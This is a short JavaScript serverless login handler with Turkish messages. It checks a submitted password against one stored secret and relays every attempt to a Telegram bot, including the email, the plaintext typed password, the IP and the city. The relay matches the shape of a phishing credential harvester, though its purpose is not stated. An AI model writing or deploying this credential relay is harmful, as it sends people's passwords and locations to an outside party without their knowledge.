export default async function handler(req, res) {
    if (req.method !== 'POST') return res.status(405).end();
    
    try {
        const { email, pass, ipData } = req.body;
        
        // Vercel'deki isimlerle birebir aynı
        const BOT_TOKEN = process.env.BOT_TOKEN;
        const CHAT_ID = process.env.TELEGRAM_ID;
        const DOGRU_SIFRE = process.env.SIFRE;

        const girisBasarili = (String(pass) === String(DOGRU_SIFRE));

        const mesaj = `🚀 **GİRİŞ DENEMESİ**\n\n📧 E-posta: ${email}\n🔑 Girilen: ${pass}\n📡 IP: ${ipData.ip}\n📍 Konum: ${ipData.city}\n✅ Durum: ${girisBasarili ? "BAŞARILI" : "HATALI"}`;

        // Telegram bildirimi
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: mesaj,
                parse_mode: 'Markdown'
            })
        });

        if (girisBasarili) {
            return res.status(200).json({ success: true });
        } else {
            return res.status(401).json({ success: false, message: "Şifre yanlış!" });
        }
    } catch (error) {
        console.error(error);
        return res.status(500).json({ success: false, error: "Sunucu hatası" });
    }
}



